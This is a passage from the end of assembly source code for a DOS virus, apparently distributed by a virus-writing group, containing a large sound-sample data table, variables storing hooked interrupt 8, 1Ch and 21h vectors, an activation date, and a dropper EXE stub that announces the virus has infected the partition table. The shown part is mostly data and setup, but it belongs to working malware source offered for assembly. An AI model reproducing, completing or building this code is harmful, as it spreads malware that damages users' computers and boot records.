		db	03eh,038h,07ch,07ch,060h,070h,079h,081h,0e0h,0e2h,063h,0c1h,0c1h,0c3h,087h,0c7h
		db	087h,007h,03fh,00eh,00ch,0ceh,03eh,033h,038h,078h,07ch,0e0h,0e0h,0f9h,0e3h,083h
		db	0f1h,085h,0cfh,0e6h,007h,01fh,098h,01ch,07eh,020h,070h,0fch,031h,099h,0d8h,0c6h
		db	067h,063h,01bh,09dh,08ch,00eh,07bh,030h,079h,0e0h,080h,0fbh,0cch,003h,0e7h,030h
		db	00fh,09ch,0c0h,03eh,033h,000h,0fch,0ceh,003h,0f3h,098h,00dh,0ceh,060h,037h,039h
		db	080h,0dch,0e7h,001h,073h,09ch,007h,0ceh,070h,01fh,01ch,0c0h,03eh,073h,000h,0f1h
		db	0cch,001h,0cfh,038h,006h,03eh,0e0h,00ch,0ffh,098h,043h,0feh,061h,00fh,0f9h,084h
		db	077h,0f2h,010h,08fh,0cch,003h,03fh,091h,000h,07fh,002h,013h,0fch,0c8h,047h,0fbh
		db	030h,00ch,0e6h,00ch,00dh,0dch,020h,099h,0b8h,0cch,013h,0e3h,038h,08dh,08ch,0e1h
		db	099h,03bh,0d8h,099h,0bfh,0ech,0c4h,07fh,09ch,0c8h,0ceh,07eh,004h,02fh,0f9h,000h
		db	027h,0f7h,020h,01bh,0ffh,0c0h,00eh,0f7h,060h,011h,0ffh,0c0h,006h,0ffh,080h,001h
		db	0feh,0c4h,066h,0fch,0d0h,011h,0ddh,0c4h,067h,027h,033h,0fch,0cch,046h,066h,072h
		db	000h,0cfh,0eeh,0c0h,00fh,077h,030h,019h,09fh,0e0h,000h,0dfh,0d8h,011h,01ch,0cch
		db	0cch,046h,067h,073h,011h,099h,09ch,0cch,0e6h,062h,033h,03bh,011h,08dh,0feh,0c4h
		db	003h,07fh,0b9h,080h,08ch,0f6h,062h,000h,03dh,0dch,000h,007h,0fbh,010h,019h,0bfh
		db	0e2h,046h,007h,033h,0b1h,008h,06eh,063h,031h,09fh,0f0h,000h,067h,073h,011h,099h
		db	0cfh,033h,030h,030h,0d9h,098h,080h,03fh,0fch,000h,04fh,0efh,073h,030h,018h,07fh
		db	0fch,000h,019h,0feh,000h,037h,0ffh,080h,000h,037h,08eh,0f9h,000h,003h,0ffh,080h
		db	006h,0ffh,0f0h,000h,01eh,0f1h,0dbh,080h,000h,037h,0f0h,000h,027h,0f3h,040h,04eh
		db	0e7h,000h,04fh,0c6h,000h,0dfh,0ceh,080h,09dh,0cch,001h,09fh,0c4h,000h,09fh,0fch
		db	001h,09fh,080h,000h,0bfh,0c8h,080h,09dh,0cch,080h,0ceh,0e4h,040h,04eh,0ffh,022h
		db	027h,072h,010h,013h,0bbh,098h,00dh,0dch,084h,002h,077h,062h,001h,0bbh,0b0h,080h
		db	04eh,0ech,040h,01bh,0bbh,010h,006h,0eeh,042h,000h,09dh,0d8h,080h,013h,0bbh,000h
		db	002h,077h,062h,004h,06eh,0e4h,020h,00ch,0eeh,0c0h,000h,0cch,0ech,000h,00ch,0eeh
		db	0c0h,000h,06eh,0f4h,000h,006h,077h,040h,002h,033h,0feh,080h,018h,0dfh,0f0h,000h
		db	046h,07fh,0c0h,023h,01bh,0f6h,000h,00ch,0ffh,0d8h,010h,031h,07eh,070h,03ch,00fh
		db	0e0h,0f8h,01fh,081h,0f0h,03eh,007h,0c0h,0f0h,03eh,003h,003h,0f0h,038h,03fh,003h
		db	081h,0f0h,03ch,01fh,081h,0c1h,0f0h,01ch,00fh,081h,0e0h,0f8h,01eh,00fh,080h,0e0h
		db	07fh,07fh,0ffh,0ffh,0ffh,0ffh,0ffh,0feh,06ch,092h,0d9h,0a6h,0c6h,082h,0c8h,032h
		db	049h,000h,083h,07fh,0b0h,000h,016h,0ffh,0a0h,000h,05fh,0fdh,080h,042h,0bfh,0f0h
		db	082h,009h,02dh,010h,080h,099h,06bh,040h,006h,0cah,0a0h,000h,0bdh,0b4h,000h,050h
		db	0b4h,001h,0d1h,0a4h,081h,0d3h,046h,096h,0d6h,0a2h,049h,0dbh,040h,0b7h,0f4h,083h
		db	06dh,0e9h,026h,0f1h,0f2h,027h,0f3h,0a4h,0b7h,063h,060h,01fh,0c7h,0f1h,036h,0cfh
		db	0b0h,03eh,00dh,0b0h,07eh,00bh,0d0h,07bh,01bh,0c0h,07ch,01bh,064h,06ch,01fh,024h
		db	064h,00dh,036h,066h,04dh,093h,023h,06dh,01bh,003h,02dh,09dh,007h,085h,09dh,087h
		db	0c4h,08eh,087h,0c4h,0c6h,0c3h,0c4h,0c7h,043h,066h,043h,003h,0e6h,043h,081h,0b2h
		db	065h,081h,0b2h,061h,081h,0b3h,063h,081h,0d3h,033h,0c1h,0f1h,031h,091h,0b1h,033h
		db	0b1h,0f1h,033h,0a1h,0e1h,023h,021h,0e1h,023h,063h,063h,066h,066h,0e3h,066h,0e4h
		db	0c7h,04dh,0cdh,08fh,013h,05bh,09eh,066h,064h,0ech,0cch,0c9h,0ddh,099h,091h,0bbh
		db	017h,04fh,0d8h,02eh,00fh,032h,07eh,01eh,068h,0f8h,079h,091h,0f0h,0f7h,046h,0c5h
		db	0deh,09fh,09fh,0edh,07ch,02fh,0b3h,034h,05eh,04ch,099h,0b9h,0bbh,032h,0cah,0cch
		db	0dbh,009h,013h,00dh,034h,02eh,064h,0d8h,0b9h,0a1h,023h,064h,08ch,08dh,092h,032h
		db	03ch,0c8h,0c8h,0fah,037h,023h,0d0h,09ch,00eh,0c2h,0f0h,066h,04bh,0c1h,0d9h,01bh
		db	026h,064h,0cch,09bh,007h,033h,06ch,01ch,099h,0e0h,072h,065h,083h,089h,01dh,00eh
		db	024h,064h,078h,0b1h,091h,0e6h,0cch,08fh,012h,032h,038h,049h,090h,0f3h,066h,047h
		db	08dh,019h,01eh,034h,04ch,0d9h,0b3h,033h,0e6h,0cch,0c9h,019h,062h,06ch,06dh,099h
		db	0b1h,0b6h,066h,0c6h,0f8h,09bh,01dh,0c8h,0fch,033h,033h,0b1h,0ech,0cdh,0cdh,099h
		db	03ah,037h,064h,0e8h,0e7h,083h,0c1h,0cfh,007h,087h,0ddh,01fh,00fh,032h,03eh,01eh
		db	074h,07ch,07ch,0e0h,0f8h,0f9h,0c1h,0f9h,077h,043h,0e9h,0fbh,083h,0e0h,0e5h,087h
		db	082h,099h,00fh,016h,073h,023h,001h,0f1h,013h,002h,032h,006h,002h,0f2h,066h,0c0h
		db	0e2h,062h,046h,066h,00eh,00ch,0e6h,026h,040h,0e4h,07ch,000h,0e2h,06ch,001h,0c2h
		db	022h,062h,0e6h,00ch,040h,036h,01eh,002h,0e2h,036h,020h,0f2h,03ch,038h,0f3h,036h
		db	060h,0d3h,013h,042h,07bh,01bh,001h,0f9h,03fh,02ch,0f9h,01bh,0b0h,079h,091h,0b1h
		db	0f9h,01fh,083h,0f9h,09fh,003h,0fdh,09dh,09bh,0bch,0ddh,0dbh,0fch,0ddh,09bh,0fch
		db	0ech,069h,0fch,0dch,0fdh,09ch,0cch,0f9h,03eh,06ch,0bch,0bch,02eh,024h,0feh,066h
		db	034h,0deh,026h,036h,01eh,066h,066h,04eh,066h,02eh,04fh,017h,01fh,027h,033h,01fh
		db	00fh,09bh,01ah,04fh,099h,039h,027h,088h,0d8h,037h,098h,083h,007h,0cch,018h,012h
		db	04ch,01ch,006h,0a4h,036h,00eh,054h,01eh,01fh,01eh,00eh,007h,09eh,00eh,04eh,0ceh
		db	00fh,007h,087h,007h,087h,08fh,007h,003h,047h,007h,083h,0c3h,003h,083h,0e3h,081h
		db	081h,0c3h,0a3h,0e1h,0e3h,0c1h,0f1h,0f1h,0c0h,0e0h,0f9h,0c0h,0f0h,070h,0f0h,0f8h
		db	0f8h,0f0h,0f8h,07ch,0c0h,0d8h,018h,01ch,01ch,06ch,0fch,03fh,025h,0cch,04ch,00ch
		db	0ceh,06eh,03ch,0e2h,0e3h,0e3h,0e7h,0c7h,08ch,073h,032h,074h,0f0h,0f1h,0b2h,070h
		db	0f2h,078h,078h,078h,078h,078h,078h,038h,038h,03ch,03eh,01ch,03ch,01eh,01ch,01ch
		db	01eh,01fh,01eh,00fh,00eh,00eh,00fh,08fh,00fh,007h,087h,087h,043h,083h,0c3h,0c3h
		db	0c3h,0c3h,0c3h,0c3h,0c3h,0c1h,0e1h,0c3h,0e0h,0f0h,0e0h,0e0h,0f0h,0f0h,0e0h,0f0h
		db	070h,0f0h,0f8h,078h,070h,078h,070h,070h,03ch,03ch,038h,03ch,03ch,01ch,03ch,03ch
		db	01ch,01eh,01ch,09ch,01eh,01ch,01eh,01fh,01ch,00eh,01fh,01ch,00fh,01fh,01eh,00fh
		db	00fh,09fh,007h,00fh,0c7h,007h,00fh,087h,017h,087h,087h,087h,0c7h,093h,087h,0c3h
		db	0d3h,083h,0c3h,0d1h,0c3h,0e1h,0f9h,0c3h,0e1h,0e8h,0c7h,0e0h,0f8h,0e3h,0f8h,0f6h
		db	0e3h,0e8h,07eh,0e3h,0e8h,07eh,063h,0e4h,0f9h,0e3h,0e2h,0dbh,0e1h,0e1h,0c8h,0e0h
		db	070h,0cdh,0f0h,0f0h,0cch,0f1h,0f8h,0c1h,0f0h,0f0h,0f1h,038h,038h,073h,038h,03ch
		db	073h,038h,03ch,038h,01ch,01eh,03ah,01eh,01eh,03ch,08eh,01eh,01ch,08eh,00fh,01fh
		db	08eh,00fh,01fh,00eh,00fh,01eh,006h,007h,00eh,007h,04eh,049h,0e2h,036h,00dh,0e6h
		db	028h,0c1h,0f3h,006h,004h,0b3h,007h,001h,0a9h,00fh,083h,095h,007h,087h,0c7h,083h
		db	081h,0e7h,083h,093h,0b3h,083h,0c1h,0e1h,0c1h,0e1h,0e3h,0c1h,0c0h,0d1h,0c1h,0e0h
		db	0f0h,0c0h,0e0h,0f8h,0e0h,060h,070h,0e8h,0f8h,078h,0f0h,07ch,07ch,070h,038h,03eh
		db	070h,03ch,01ch,03ch,03eh,03eh,03ch,03eh,01fh,030h,036h,006h,007h,007h,01bh,03fh
		db	00fh,0c9h,073h,013h,003h,0b3h,09bh,08fh,038h,0bch,0f8h,0f9h,0f1h,0e3h,01ch,0cch
		db	09dh,03ch,03ch,06ch,09ch,03ch,09eh,01eh,01eh,01eh,01eh,01eh,00eh,00eh,00fh,00fh
		db	087h,00fh,007h,087h,007h,007h,087h,0c7h,083h,0c3h,083h,083h,0e3h,0c3h,0c1h,0e1h
		db	0f1h,0d1h,0e0h,0f0h,0f0h,0f0h,0f0h,0f0h,0f0h,0f0h,0f0h,078h,070h,0f8h,03ch,038h
		db	038h,03ch,03ch,038h,03ch,01ch,03ch,03eh,01eh,01ch,03eh,01ch,01ch,00fh,00fh,00eh
		db	00fh,00fh,007h,00fh,00fh,007h,007h,087h,027h,007h,087h,007h,087h,0c7h,003h,087h
		db	0c7h,003h,0c7h,0c7h,083h,0c3h,0e7h,0c1h,0c3h,0f1h,0c1h,0c3h,0e1h,0c5h,0e1h,0e1h
		db	0e1h,0f1h,0ech,0e1h,0f0h,0f4h,0e0h,0f0h,0f4h,070h,0f8h,07eh,070h,0f8h,07ah,031h
		db	0f8h,03eh,038h,0feh,03dh,0b8h,0fah,01fh,0b8h,0fah,01fh,098h,0f9h,03eh,078h,0f8h
		db	0b6h,0f8h,0f8h,072h,038h,01ch,033h,07ch,03ch,033h,03ch,07eh,038h,07ch,03eh,03ch
		db	04eh,00eh,01ch,0ceh,00fh,01ch,0ceh,00fh,00eh,007h,007h,08eh,087h,087h,08fh,063h
		db	087h,087h,023h,083h,0c7h,0e3h,083h,0c7h,0c3h,083h,0c7h,081h,081h,0c0h,0f9h,09bh
		db	093h,079h,08dh,083h,079h,08bh,030h,07ch,0c9h,0c3h,02ch,0c1h,0c0h,07ah,043h,0e0h
		db	0e5h,041h,0e1h,0f1h,0e0h,0e0h,0f9h,0e0h,0e4h,0ech,0e0h,0f0h,078h,070h,078h,078h
		db	0f0h,070h,034h,070h,078h,03ch,030h,038h,03eh  ; ,038h

SampleEnd	equ	this byte

;------------------------------------------------------------------------------
;
; Variables
;
;------------------------------------------------------------------------------

Active		db	-1
ActiveYear	dw	-1
ActiveDate	dw	-1

OldInt8		equ	this dword		; orginal interrupt 8
OldInt8o	dw	-1
OldInt8s	dw	-1
OldInt1C	equ	this dword		; orginal interrupt 1ch
OldInt1Co	dw	-1
OldInt1Cs	dw	-1
OldInt21	equ	this dword		; orginal interrupt 21h
OldInt21o	dw	-1
OldInt21s	dw	-1

Count		dw	-1			; timer count
SampleOffset	dw	-1			; Used to make sound
SampleBit	db	-1
SampleFlag	db	-1
Handle		dw	8 dup(-1)		; Filehandles

cseg ends

;------------------------------------------------------------------------------
;
; Orginal EXE-file
;
;------------------------------------------------------------------------------

mseg segment public 'code'
		assume	cs:mseg, ds:mseg, es:mseg


		db	'MZ'			; header
		dw	PrgSize			; PartPage
		dw	1			; PageCount
		dw	0			; relocation items = 0
		dw	0			; headersize = 0h
		dw	80h			; minimum memory
		dw	0ffffh			; maximum memory
		dw	(PrgSize+15)/10h	; ss
		dw	7feh			; sp
		dw	0			; chksum
		dw	offset Orginal		; ip
		dw	0			; cs
		dw	1ch			; offset relocation table
		dw	0			; overlay number

Orginal:	mov	ah,9			; display warning
		push	cs
		pop	ds
		mov	dx,offset Warning
		int	21h
		mov	ax,4c00h
		int	21h			; terminate

Warning		db	13,10
		db	'WARNING:',13,10
		db	13,10
		db	'Yeah virus has now infected the partition table !!!!!',13,10
		db	13,10
		db	'$'

mseg ends

sseg segment stack 'stack'
		db	800h dup(?)
sseg ends

end Main

;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴�> ReMeMbEr WhErE YoU sAw ThIs pHile fIrSt <컴컴컴컴컴컴컴�
;  컴컴컴컴컴�> ArReStEd DeVeLoPmEnT +31.77.SeCrEt H/p/A/v/AV/? <컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
